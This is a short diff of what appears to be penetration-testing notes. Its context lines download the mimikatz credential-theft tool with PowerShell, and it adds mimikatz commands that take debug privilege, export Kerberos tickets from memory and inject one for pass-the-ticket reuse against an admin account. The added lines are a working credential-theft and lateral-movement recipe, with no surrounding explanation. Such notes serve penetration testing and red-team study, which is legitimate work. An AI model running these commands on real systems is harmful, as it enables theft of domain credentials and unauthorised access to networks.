@@ -117,5 +117,7 @@ Download mimikatz
 Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"
 
 Dump tickets for admin
-
+privilege::debug
+sekurlsa::tickets /export
+kerberos::ptt [0;xxx]xxxxx.kirbi
 
